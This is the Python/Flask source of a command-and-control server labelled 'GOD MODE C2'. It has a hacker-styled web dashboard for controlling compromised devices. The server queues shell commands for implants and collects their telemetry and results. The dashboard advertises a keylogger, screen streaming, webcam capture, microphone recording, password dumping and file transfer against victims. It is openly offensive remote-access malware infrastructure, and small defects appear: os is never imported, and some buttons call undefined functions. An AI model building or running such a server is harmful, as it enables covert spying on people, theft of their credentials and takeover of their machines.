from flask import Flask, request, jsonify, render_template_string, Response
from flask_socketio import SocketIO, emit, join_room, leave_room
import sqlite3
import json
from datetime import datetime, timedelta
import base64
from PIL import Image
import io
import threading
import uuid
from collections import defaultdict

app = Flask(__name__)
app.config['SECRET_KEY'] = 'godmode_c2_secret'
socketio = SocketIO(app, cors_allowed_origins="*")

# Database
def init_db():
    conn = sqlite3.connect('c2.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS devices 
                 (device_id TEXT PRIMARY KEY, last_seen TEXT, hostname TEXT, status TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS tasks 
                 (id TEXT PRIMARY KEY, device_id TEXT, type TEXT, data TEXT, status TEXT, created TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS results 
                 (id TEXT PRIMARY KEY, device_id TEXT, task_id TEXT, type TEXT, result TEXT, timestamp TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS keystrokes 
                 (device_id TEXT, keys TEXT, timestamp TEXT)''')
    conn.commit()
    conn.close()

init_db()

# GOD MODE HTML Dashboard
GOD_MODE_UI = '''
<!DOCTYPE html>
<html>
<head>
    <title>🐱 GOD MODE C2 - Full Control</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Courier New', monospace; 
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 50%, #16213e 100%);
            color: #00ff41; 
            min-height: 100vh;
        }
        .header { 
            background: rgba(0,255,65,0.1); 
            padding: 20px; 
            border-bottom: 2px solid #00ff41;
            text-align: center;
        }
        .header h1 { font-size: 2.5em; text-shadow: 0 0 20px #00ff41; }
        .container { display: grid; grid-template-columns: 1fr 2fr 1fr; gap: 20px; padding: 20px; max-width: 1600px; margin: 0 auto; }
        .panel { 
            background: rgba(10,10,10,0.9); 
            border: 1px solid #333; 
            border-radius: 10px; 
            padding: 20px; 
            backdrop-filter: blur(10px);
        }
        .online { border-left: 5px solid #00ff41 !important; box-shadow: 0 0 20px rgba(0,255,65,0.3); }
        .offline { border-left: 5px solid #ff0040; }
        .device-card { 
            padding: 15px; margin: 10px 0; 
            background: rgba(0,255,65,0.05); 
            border-radius: 8px; 
            cursor: pointer; 
            transition: all 0.3s;
        }
        .device-card:hover { background: rgba(0,255,65,0.15); transform: scale(1.02); }
        .terminal { 
            background: #000; 
            border: 1px solid #00ff41; 
            height: 400px; 
            overflow-y: auto; 
            padding: 15px; 
            font-family: 'Courier New', monospace;
            font-size: 14px;
            white-space: pre-wrap;
        }
        .cmd-input { 
            width: 100%; padding: 12px; 
            background: #111; 
            border: 1px solid #00ff41; 
            color: #00ff41; 
            border-radius: 5px; 
            font-family: 'Courier New', monospace;
            margin-bottom: 10px;
        }
        button { 
            background: linear-gradient(45deg, #00ff41, #00cc33); 
            border: none; 
            padding: 10px 20px; 
            color: #000; 
            font-weight: bold; 
            border-radius: 5px; 
            cursor: pointer; 
            margin: 5px; 
            transition: all 0.3s;
        }
        button:hover { transform: scale(1.05); box-shadow: 0 0 15px rgba(0,255,65,0.5); }
        .control-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 10px; }
        .stream-container { position: relative; }
        .stream-video { max-width: 100%; border-radius: 8px; border: 2px solid #00ff41; }
        .stats { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; font-size: 12px; }
        .status-dot { display: inline-block; width: 12px; height: 12px; border-radius: 50%; margin-right: 8px; }
        .online-dot { background: #00ff41; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
    </style>
</head>
<body>
    <div class="header">
        <h1>🐱 GOD MODE C2 PANEL</h1>
        <p>Full System Control | Live Streaming | File Manager | Keylogger</p>
    </div>
    
    <div class="container">
        <!-- Devices Panel -->
        <div class="panel" id="devices-panel">
            <h3>🎯 ACTIVE DEVICES</h3>
            <div id="devices-list"></div>
        </div>
        
        <!-- Main Terminal -->
        <div class="panel online">
            <h3>💻 LIVE TERMINAL <span id="selected-device">-</span></h3>
            <div class="cmd-input" id="cmd-input" placeholder="Select device and enter commands..."></div>
            <button onclick="executeCmd()">▶️ EXECUTE</button>
            <button onclick="clearTerminal()">🗑️ CLEAR</button>
            <div class="terminal" id="terminal"></div>
        </div>
        
        <!-- Controls Panel -->
        <div class="panel">
            <h3>⚡ QUICK ACTIONS</h3>
            <div class="control-grid">
                <button onclick="toggleStream()">📺 Screen Stream</button>
                <button onclick="takeWebcam()">📸 Webcam Snap</button>
                <button onclick="toggleKeylog()">⌨️ Keylogger</button>
                <button onclick="recordMic()">🎤 Record Mic</button>
                <button onclick="dumpPasswords()">🔑 Dump Passwords</button>
                <button onclick="listFiles()">📁 File Browser</button>
                <button onclick="uploadFile()">⬆️ Upload File</button>
                <button onclick="downloadFile()">⬇️ Download File</button>
            </div>
            <h4 style="margin-top: 20px;">📊 Live Stats</h4>
            <div id="live-stats" class="stats"></div>
        </div>
    </div>

    <script>
        const socket = io();
        let selectedDevice = null;
        let streaming = false;
        
        socket.on('connect', () => {
            console.log('Connected to C2 server');
        });
        
        socket.on('telemetry', (data) => {
            updateDeviceStatus(data.device_id, data);
        });
        
        socket.on('keystroke', (data) => {
            logToTerminal(`[${data.keys}] Keystroke captured from ${data.device_id.slice(0,8)}`);
        });
        
        function updateDeviceStatus(deviceId, data) {
            const deviceEl = document.querySelector(`[data-device="${deviceId}"]`);
            if (deviceEl) {
                deviceEl.classList.add('online');
                deviceEl.innerHTML = `
                    <div><strong>${data.hostname || 'Unknown'}</strong> (${deviceId.slice(0,8)})</div>
                    <div class="status-dot online-dot"></div>CPU: ${data.cpu}%<br>
                    RAM: ${data.ram}% | Procs: ${data.processes}
                `;
                document.getElementById('live-stats').innerHTML = `
                    <div>CPU: ${data.cpu}%</div>
                    <div>RAM: ${data.ram}%</div>
                    <div>IP: ${data.public_ip}</div>
                    <div>Processes: ${data.processes}</div>
                `;
            }
        }
        
        function loadDevices() {
            fetch('/api/devices').then(r => r.json()).then(devices => {
                const list = document.getElementById('devices-list');
                list.innerHTML = '';
                devices.forEach(device => {
                    const div = document.createElement('div');
                    div.className = 'device-card';
                    div.dataset.device = device.device_id;
                    div.onclick = () => selectDevice(device.device_id);
                    div.innerHTML = `
                        <strong>${device.hostname}</strong><br>
                        ${device.device_id.slice(0,8)}...
                    `;
                    list.appendChild(div);
                });
            });
        }
        
        function selectDevice(deviceId) {
            selectedDevice = deviceId;
            document.querySelectorAll('.device-card').forEach(d => d.style.background = 'rgba(0,255,65,0.05)');
            document.querySelector(`[data-device="${deviceId}"]`).style.background = 'rgba(0,255,65,0.25)';
            document.getElementById('selected-device').textContent = deviceId.slice(0,8);
            document.getElementById('cmd-input').placeholder = `Commands for ${deviceId.slice(0,8)}...`;
        }
        
        function executeCmd() {
            if (!selectedDevice) return alert('Select a device first!');
            const cmd = document.getElementById('cmd-input').value;
            fetch('/api/task', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    device_id: selectedDevice,
                    type: 'shell',
                    command: cmd
                })
            });
            logToTerminal(`$ ${cmd}`);
            document.getElementById('cmd-input').value = '';
        }
        
        function logToTerminal(text) {
            const terminal = document.getElementById('terminal');
            terminal.innerHTML += `[${new Date().toLocaleTimeString()}] ${text}\\n`;
            terminal.scrollTop = terminal.scrollHeight;
        }
        
        function toggleStream() {
            fetch('/api/task', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    device_id: selectedDevice,
                    type: 'stream',
                    active: !streaming
                })
            });
            streaming = !streaming;
        }
        
        // Other control functions...
        function takeWebcam() {
            if (!selectedDevice) return;
            fetch('/api/task', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    device_id: selectedDevice,
                    type: 'webcam'
                })
            });
        }
        
        function clearTerminal() {
            document.getElementById('terminal').innerHTML = '';
        }
        
        // Auto refresh
        setInterval(loadDevices, 3000);
        loadDevices();
    </script>
</body>
</html>
'''

@app.route('/')
def dashboard():
    return render_template_string(GOD_MODE_UI)

@app.route('/api/devices')
def api_devices():
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute('SELECT * FROM devices ORDER BY last_seen DESC')
    devices = []
    for row in c.fetchall():
        devices.append({
            'device_id': row[0],
            'last_seen': row[1],
            'hostname': row[2],
            'status': row[3]
        })
    conn.close()
    return jsonify(devices)

@app.route('/api/task', methods=['POST'])
def create_task():
    data = request.json
    task_id = str(uuid.uuid4())
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute('INSERT INTO tasks (id, device_id, type, data, status, created) VALUES (?, ?, ?, ?, ?, ?)',
              (task_id, data['device_id'], data['type'], json.dumps(data), 'pending', datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return jsonify({'task_id': task_id})

@app.route('/tasks/<device_id>')
def get_tasks(device_id):
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute('SELECT * FROM tasks WHERE device_id=? AND status="pending" ORDER BY created LIMIT 10', (device_id,))
    tasks = []
    for row in c.fetchall():
        tasks.append({
            'id': row[0],
            'type': row[2],
            'data': json.loads(row[3])
        })
    conn.close()
    return jsonify({'tasks': tasks})

@app.route('/telemetry', methods=['POST'])
def telemetry():
    data = request.json
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute('INSERT OR REPLACE INTO devices VALUES (?, ?, ?, ?)',
              (data['device_id'], data['timestamp'], data['hostname'], 'online'))
    conn.commit()
    conn.close()
    
    socketio.emit('telemetry', data)
    return jsonify({'status': 'ok'})

@app.route('/result', methods=['POST'])
def task_result():
    data = request.json
    result_id = str(uuid.uuid4())
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute('INSERT INTO results VALUES (?, ?, ?, ?, ?, ?)',
              (result_id, data['device_id'], data['task_id'], data['type'], 
               json.dumps(data['result']), datetime.now().isoformat()))
    c.execute('UPDATE tasks SET status="completed" WHERE id=?', (data['task_id'],))
    conn.commit()
    conn.close()
    return jsonify({'status': 'received'})

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
